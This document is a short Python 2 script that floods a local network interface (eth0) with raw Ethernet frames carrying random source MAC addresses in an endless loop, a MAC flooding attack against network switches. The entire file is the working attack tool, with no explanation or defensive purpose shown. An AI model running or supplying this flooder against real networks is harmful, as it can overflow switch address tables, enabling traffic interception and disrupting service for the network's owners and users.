from socket import *
import random


def RandMac():
  rand_str = "0123456789abcdef"
  result = ""
  for i in xrange(0,12):
    result += random.choice(rand_str)
  return result.decode('hex')

def mac_flood(iface):
  sock = socket(AF_PACKET,SOCK_RAW)
  sock.bind((iface,0))
  cache_mac = "ffffffffffff".decode('hex')
  while 1:
    rand_mac = RandMac()
    packet = cache_mac + rand_mac + "\x08\x00"
    sock.send(packet)
    print "[INFO] Send:",packet.encode('hex')
    cache_mac = rand_mac
def main():
  iface = "eth0"
  mac_flood(iface)

if __name__ == "__main__":
  main()
